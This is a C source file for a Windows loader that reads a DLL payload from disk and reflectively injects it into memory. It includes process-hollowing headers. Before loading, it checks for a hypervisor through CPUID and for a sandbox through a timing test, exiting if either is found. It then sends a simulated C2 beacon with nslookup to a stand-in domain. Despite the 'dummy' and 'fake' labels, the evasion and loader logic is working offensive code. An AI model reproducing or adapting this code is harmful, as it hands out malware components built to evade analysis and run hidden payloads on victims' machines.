#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "reflective_loader.h"
#include "process_hollowing.h"
#include <cpuid.h>

// Load full DLL file into memory
LPVOID load_payload(const char* path, DWORD* size) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open %s (0x%lx)\n", path, GetLastError());
        return NULL;
    }

    *size = GetFileSize(hFile, NULL);
    if (*size == INVALID_FILE_SIZE) {
        printf("[!] GetFileSize failed for %s (0x%lx)\n", path, GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *size);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, *size, &bytesRead, NULL) || bytesRead != *size) {
        printf("[!] Failed to fully read %s: expected %lu bytes, got %lu bytes\n", path, *size, bytesRead);
        HeapFree(GetProcessHeap(), 0, buffer);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    printf("[+] Successfully loaded %s (%lu bytes)\n", path, *size);
    return buffer;
}

// Basic VM detection
int detect_vm() {
    unsigned int eax, ebx, ecx, edx;
    __cpuid(1, eax, ebx, ecx, edx);
    if (ecx & (1 << 31)) {
        printf("[!] Hypervisor detected. Exiting.\n");
        return 1;
    }
    DWORD start = GetTickCount();
    Sleep(3000);
    DWORD elapsed = GetTickCount() - start;
    if (elapsed < 2900) {
        printf("[!] Timing anomaly detected (sandbox).\n");
        return 1;
    }
    return 0;
}

// Fake C2 ping simulation
void c2_ping() {
    printf("[*] Pinging fake C2...\n");
    system("nslookup my-fake-c2-domain.com > nul");
    printf("[+] C2 ping done.\n");
}

int main() {
    printf("===== Loader — Direct DLL Reflective Injection =====\n");

    if (detect_vm()) return 1;

    DWORD file_size = 0;
    unsigned char* payload = load_payload("dummy_payload.dll", &file_size);
    if (!payload) return 1;
    printf("[+] DLL payload loaded (%ld bytes)\n", file_size);

    if (((PIMAGE_DOS_HEADER)payload)->e_magic == IMAGE_DOS_SIGNATURE) {
        printf("[+] PE Detected — Reflective Injection...\n");
        reflective_load(payload);
    } else {
        printf("[!] Invalid PE file. Exiting.\n");
        HeapFree(GetProcessHeap(), 0, payload);
        return 1;
    }

    c2_ping();
    HeapFree(GetProcessHeap(), 0, payload);
    return 0;
}
